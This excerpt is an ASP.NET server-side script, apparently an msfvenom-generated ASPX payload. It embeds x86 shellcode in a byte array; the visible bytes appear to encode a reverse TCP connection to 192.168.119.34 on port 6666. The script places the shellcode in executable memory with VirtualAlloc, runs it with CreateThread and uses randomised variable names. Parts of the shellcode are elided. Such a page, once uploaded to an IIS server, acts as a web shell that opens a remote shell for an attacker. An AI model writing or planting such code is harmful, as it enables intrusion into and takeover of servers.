...
<script runat="server">
    ...
    {
        byte[] pkv = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x77,0x22,0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr mvF = VirtualAlloc(IntPtr.Zero,(UIntPtr)pkv.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(pkv,0,mvF,pkv.Length);
        IntPtr q3nsp4lTHWCb = IntPtr.Zero;
        IntPtr qxlbD = CreateThread(IntPtr.Zero,UIntPtr.Zero,mvF,IntPtr.Zero,0,ref q3nsp4lTHWCb);
    }
</script>
